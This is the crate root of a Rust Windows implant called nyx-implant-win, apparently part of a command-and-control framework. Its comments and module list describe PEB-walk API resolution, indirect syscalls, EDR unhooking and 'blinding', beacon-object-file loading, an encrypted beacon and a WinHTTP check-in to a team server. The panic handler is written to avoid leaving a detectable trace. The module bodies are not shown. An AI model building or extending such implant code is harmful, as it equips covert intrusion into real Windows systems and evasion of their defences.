//! nyx-implant-win — Windows position-independent implant.
//!
//! This crate builds the real Windows PIC agent: `#![no_std]` + `#![no_main]`,
//! a custom NT-Heap allocator, PEB-walk API resolution, indirect syscalls, and
//! a task loop that reuses [`nyx_protocol`] for the encrypted beacon frame.
//!
//! ## Build
//! Requires nightly + the `x86_64-pc-windows-gnu` (or msvc) target. It is
//! intentionally NOT a workspace member so `cargo build --workspace` stays green
//! on the macOS dev host. Check it standalone:
//!
//! ```text
//! cargo +nightly check -p nyx-implant-win --target x86_64-pc-windows-gnu
//! ```
//!
//! Full link + the sRDI PIC-extraction step happen on a Windows host.
//!
//! ## Modules
//! - [`heap`] — alloc glue (Vec/String + a raw-byte `Str`) for the PEB walk.
//! - [`resolve`] — PEB walk + djb2 API resolution; bridges to `nyx_evasion`
//!   so the SSN resolver runs over the *live* ntdll. (Windows-only.)
//! - (A3) `alloc` — NT-Heap `GlobalAlloc`.
//! - (A4) `entry` — PIC entry stub.
//! - (A5) `transport` — minimal WinHTTP check-in.
//! - (A6) indirect-syscall runtime wired to `nyx_evasion`.

#![no_std]
#![no_main]

extern crate alloc;

// Team server long-term pubkey, baked at build time by build.rs (H7). A real
// engagement sets NYX_SERVER_PUB; dev builds fall back to a marked test key.
// Either way it is a valid (non-identity) X25519 point so the ECDH no longer
// collapses and session keys are genuinely derived.
mod server_pub {
    include!(concat!(env!("OUT_DIR"), "/server_pub.rs"));
}

pub mod heap;

#[cfg(target_os = "windows")]
pub mod ntalloc;
#[cfg(target_os = "windows")]
pub mod beacon;
#[cfg(target_os = "windows")]
pub mod blind;
#[cfg(target_os = "windows")]
pub mod bof;
#[cfg(target_os = "windows")]
pub mod entry;
#[cfg(target_os = "windows")]
pub mod resolve;
#[cfg(target_os = "windows")]
pub mod syscalls;
#[cfg(target_os = "windows")]
pub mod transport;
#[cfg(target_os = "windows")]
pub mod unhook;

// Register the NT-Heap allocator so Vec/String work under #![no_std].
#[cfg(target_os = "windows")]
#[global_allocator]
static HEAP: ntalloc::NtHeapAllocator = ntalloc::NtHeapAllocator;

#[panic_handler]
fn _panic(info: &core::panic::PanicInfo) -> ! {
    // panic = abort. In a PIC implant an infinite spin is a loud IOC (one core
    // pinned at 100%), so prefer a clean process exit. We can only resolve
    // ExitProcess on Windows; on the dev host (no target_os=windows) trap.
    #[cfg(target_os = "windows")]
    {
        // Best-effort: resolve ExitProcess and exit with a non-zero code so the
        // host/loader reaps us. If resolution fails (catastrophic — ntdll gone),
        // fall through to the trap.
        if let Some(addr) = unsafe { resolve::export_addr(b"kernel32.dll", b"ExitProcess") } {
            let f: extern "system" fn(u32) -> ! = unsafe { core::mem::transmute(addr) };
            // Touch `info` so it's "used" and not dropped with a warning.
            let _ = info;
            f(0xC000_0001);
        }
    }
    // Defensive trap — only reached if we can't exit cleanly.
    let _ = info;
    loop {
        core::hint::spin_loop();
    }
}
